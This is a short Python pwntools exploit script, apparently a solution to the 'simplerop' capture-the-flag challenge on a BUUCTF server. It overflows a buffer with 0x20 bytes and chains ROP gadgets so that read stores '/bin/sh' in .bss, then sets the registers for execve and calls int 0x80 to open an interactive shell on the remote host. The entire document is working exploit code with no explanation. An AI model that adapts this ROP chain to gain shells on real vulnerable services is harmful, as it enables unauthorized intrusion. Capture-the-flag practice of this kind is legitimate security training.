from pwn import *
context(log_level='debug')
#io = process("./simplerop")
io = remote("node4.buuoj.cn",26293)
elf = ELF('./simplerop')
int_80 = 0x080493e1
pop_eax = 0x080bae06
pop_edx_ecx_ebx = 0x0806e850
read_addr = elf.sym['read']
bss_bin_sh_addr = 0x080EB590
payload = 'a'*0x20 
payload += p32(read_addr)
payload += p32(pop_edx_ecx_ebx)
payload += p32(0) 
payload += p32(bss_bin_sh_addr)
payload += p32(0x8)
payload += p32(pop_eax) 
payload += p32(0xb) 
payload += p32(pop_edx_ecx_ebx) 
payload += p32(0)
payload += p32(0)
payload += p32(bss_bin_sh_addr)
payload += p32(int_80)
io.recv()
io.send(payload)
io.send('/bin/sh')
io.interactive()